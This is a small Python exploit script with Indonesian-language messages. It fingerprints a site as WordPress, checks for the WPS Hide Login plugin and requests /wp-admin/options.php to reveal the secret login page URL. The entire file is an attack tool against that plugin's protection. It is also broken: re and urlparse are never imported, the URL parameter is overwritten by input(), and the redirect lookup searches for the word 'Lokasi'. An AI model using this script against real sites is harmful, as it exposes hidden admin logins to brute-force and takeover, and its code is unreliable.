import os
import requests
from urllib.parse import urljoin
from colorama import Fore
import builtwith

def exploit_wps_hide_login(url):
    os.system("cls")
    print(Fore.GREEN + "Silakan masukkan URL: ")
    url = input()
    search = builtwith.parse(url)

    for key, value in search.items():
        for i in value:
            if "Wordpress" in i:
                print("Wordpress Terdeteksi")
                plugin_url = urljoin(url, "/wp-content/plugins/wps-hide-login")
                response = requests.get(plugin_url)

                if response.status_code == 200 or response.status_code == 403:
                    print(Fore.GREEN + "Login Ditemukan")
                    exploit_url = f"{url}/wp-admin/options.php"
                    response = requests.get(exploit_url)
                    lines = response.text.split("\n")

                    for line in lines:
                        if "Lokasi" in line:
                            url_lokasi = find_urls(line)

                    for x in url_lokasi:
                        final_result = str(x)
                        o = urlparse(final_result)
                        secret_login_page = urljoin(url, o.path)

                        if "404" in secret_login_page:
                            print(Fore.RED + "Not Vuln")
                            exit(0)
                        else:
                            print(f"Login ditemukan ::: {secret_login_page}")
                else:
                    print(Fore.RED + "wps_hide_login tidak ada")
                    exit(0)

def find_urls(string):
    regex = r"(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^s()<>]+|(\([^\s()<>]+\))))?)"
    url = re.findall(regex, string)
    return [x[0] for x in url]

exploit_wps_hide_login("")
